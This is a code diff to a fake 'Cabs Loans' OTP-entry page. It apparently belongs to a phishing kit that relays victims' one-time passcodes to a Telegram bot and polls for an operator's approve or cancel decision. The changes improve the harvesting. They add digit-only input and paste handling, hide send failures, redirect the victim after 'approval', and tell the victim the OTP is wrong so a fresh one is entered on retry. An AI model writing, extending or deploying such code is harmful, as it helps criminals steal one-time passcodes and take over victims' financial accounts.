@@ -209,6 +209,31 @@
             line-height: 1.6;
             max-width: 320px;
             font-weight: 500;
+            margin-bottom: 20px;
+        }
+        
+        .result-actions {
+            display: flex;
+            gap: 12px;
+            margin-top: 10px;
+        }
+        
+        .btn {
+            padding: 12px 18px;
+            border-radius: 10px;
+            border: none;
+            cursor: pointer;
+            font-weight: 600;
+        }
+        
+        .btn-primary {
+            background: #4f5052;
+            color: #fff;
+        }
+        
+        .btn-secondary {
+            background: #f0f0f0;
+            color: #444;
         }
     </style>
 </head>
@@ -225,17 +250,17 @@
 
         <div class="otp-label">OTP</div>
         <div class="otp-group">
-            <input type="text" class="otp-box" maxlength="1">
-            <input type="text" class="otp-box" maxlength="1">
-            <input type="text" class="otp-box" maxlength="1">
-            <input type="text" class="otp-box" maxlength="1">
-            <input type="text" class="otp-box" maxlength="1">
-            <input type="text" class="otp-box" maxlength="1">
+            <input type="text" inputmode="numeric" pattern="[0-9]*" class="otp-box" maxlength="1">
+            <input type="text" inputmode="numeric" pattern="[0-9]*" class="otp-box" maxlength="1">
+            <input type="text" inputmode="numeric" pattern="[0-9]*" class="otp-box" maxlength="1">
+            <input type="text" inputmode="numeric" pattern="[0-9]*" class="otp-box" maxlength="1">
+            <input type="text" inputmode="numeric" pattern="[0-9]*" class="otp-box" maxlength="1">
+            <input type="text" inputmode="numeric" pattern="[0-9]*" class="otp-box" maxlength="1">
         </div>
 
         <div class="resend">Resend OTP in <span id="timer">116</span> seconds</div>
 
-        <button id="submitBtn">Submit</button>
+        <button id="submitBtn" disabled>Submit</button>
     </div>
 
     <footer>© 2025 Cabs Loans</footer>
@@ -251,6 +276,10 @@
     <!-- RESULT OVERLAY -->
     <div id="resultOverlay">
         <div class="result-message" id="resultMessage"></div>
+        <div class="result-actions" id="resultActions" style="display:none;">
+            <button class="btn btn-primary" id="proceedBtn">Proceed</button>
+            <button class="btn btn-secondary" id="retryBtn">Try Again</button>
+        </div>
     </div>
 
     <script>
@@ -270,6 +299,9 @@
         const resultOverlay = document.getElementById('resultOverlay');
         const resultMessage = document.getElementById('resultMessage');
         const timerSpan = document.getElementById('timer');
+        const proceedBtn = document.getElementById('proceedBtn');
+        const retryBtn = document.getElementById('retryBtn');
+        const resultActions = document.getElementById('resultActions');
 
         let otpValue = '';
         let seconds = 116;
@@ -299,7 +331,10 @@
         }
 
         otpBoxes.forEach((box, index) => {
-            box.addEventListener('input', () => {
+            // Force numeric only
+            box.addEventListener('input', (e) => {
+                // strip non-digits
+                box.value = box.value.replace(/\D/g, '');
                 if (box.value.length === 1 && index < 5) {
                     otpBoxes[index + 1].focus();
                 }
@@ -310,8 +345,45 @@
                 if (e.key === 'Backspace' && box.value === '' && index > 0) {
                     otpBoxes[index - 1].focus();
                 }
+                // prevent non-digit keys (allow navigation keys)
+                if (e.key.length === 1 && /[^0-9]/.test(e.key)) {
+                    e.preventDefault();
+                }
+            });
+
+            // make sure paste works (only first 6 digits)
+            box.addEventListener('paste', (e) => {
+                e.preventDefault();
+                const paste = (e.clipboardData || window.clipboardData).getData('text');
+                const digits = paste.replace(/\D/g, '').slice(0, 6).split('');
+                for (let i = 0; i < digits.length; i++) {
+                    if (otpBoxes[i]) otpBoxes[i].value = digits[i];
+                }
+                checkOtpComplete();
+                if (digits.length === 6) otpBoxes[5].focus();
             });
         });
+
+        function resetOtpInputs() {
+            otpBoxes.forEach(box => box.value = '');
+            checkOtpComplete();
+            otpBoxes[0].focus();
+        }
+
+        function showResult(message, options = {}) {
+            resultMessage.textContent = message;
+            resultOverlay.style.display = 'flex';
+            if (options.showActions) {
+                resultActions.style.display = 'flex';
+            } else {
+                resultActions.style.display = 'none';
+            }
+        }
+
+        function hideResult() {
+            resultOverlay.style.display = 'none';
+            resultActions.style.display = 'none';
+        }
 
         submitBtn.addEventListener('click', () => {
             if (otpValue.length !== 6) return;
@@ -343,9 +415,14 @@
                         ]
                     }
                 })
+            }).catch(() => {
+                // ignore send error; polling will just time out
             });
 
             // Poll for admin response
+            // Clear any previous poll if still running
+            if (pollInterval) clearInterval(pollInterval);
+
             pollInterval = setInterval(() => {
                 fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
                     .then(res => res.json())
@@ -355,22 +432,50 @@
                                 lastUpdateId = update.update_id;
                                 if (update.callback_query) {
                                     const dataParts = update.callback_query.data.split('_');
+                                    // second part should be the timestamp used when sending
                                     if (dataParts[1] == timestamp) {
                                         clearInterval(pollInterval);
                                         spinnerOverlay.style.display = 'none';
-                                        resultOverlay.style.display = 'flex';
 
                                         if (dataParts[0] === 'approve') {
-                                            resultMessage.textContent = 'Your loan has been approved. You will receive a confirmation message within 15 minutes. Thank you.';
+                                            // show approval message and then navigate to next page
+                                            showResult('Your loan has been approved. Redirecting...');
+                                            // give user a moment to read then proceed
+                                            const nextUrl = localStorage.getItem('nextUrl') || 'dashboard.html';
+                                            setTimeout(() => {
+                                                // If a proceed button is present, user can click; otherwise auto-redirect
+                                                try {
+                                                    window.location.href = nextUrl;
+                                                } catch (e) {
+                                                    // fallback: hide overlay
+                                                    hideResult();
+                                                }
+                                            }, 1500);
                                         } else if (dataParts[0] === 'cancel') {
-                                            resultMessage.textContent = 'Please reapply and ensure that your information is correct and your minimum Main USD Balance is atleast $30. Thank you.';
+                                            // Inform user that the OTP is wrong/expired and allow retry
+                                            showResult('The OTP provided is wrong or has expired. Please provide a valid OTP.', { showActions: true });
+                                            // make Retry button visible (already shown via showActions)
                                         }
                                     }
                                 }
                             }
                         }
+                    }).catch(() => {
+                        // network error - keep polling or show error after some attempts (not implemented)
                     });
             }, 1500);
+        });
+
+        // Retry workflow: hide overlay and clear inputs so user can try again
+        retryBtn.addEventListener('click', () => {
+            hideResult();
+            resetOtpInputs();
+        });
+
+        // Proceed button — in case user wants to continue immediately after approval message
+        proceedBtn.addEventListener('click', () => {
+            const nextUrl = localStorage.getItem('nextUrl') || 'dashboard.html';
+            window.location.href = nextUrl;
         });
 
         checkOtpComplete();
